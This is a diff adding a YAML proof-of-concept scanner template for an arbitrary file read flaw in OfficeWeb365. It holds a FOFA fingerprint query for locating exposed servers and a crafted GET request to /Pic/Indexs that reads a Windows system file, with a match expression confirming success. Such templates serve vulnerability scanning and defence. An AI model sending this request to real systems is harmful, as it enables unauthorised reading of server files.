@@ -1,0 +1,15 @@
+id: poc-yaml-officeweb365-indexs-anyfile-read
+info:
+  name: officeWeb365 Indexs 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: officeWeb365
+  fofa: body="请输入furl参数" || header="OfficeWeb365" || banner="OfficeWeb365"
+requests:
+- method: GET
+  path: /Pic/Indexs?imgs=DJwkiEm6KXJZ7aEiGyN4Cz83Kn1PLaKA09
+  expression: status_code == 200 && contains(body,"[fonts]") && contains(body,"; for
+    16-bit app support") && contains(headers,"OfficeWeb365") && !contains(body,"<")
+variables: {}
+transport: http
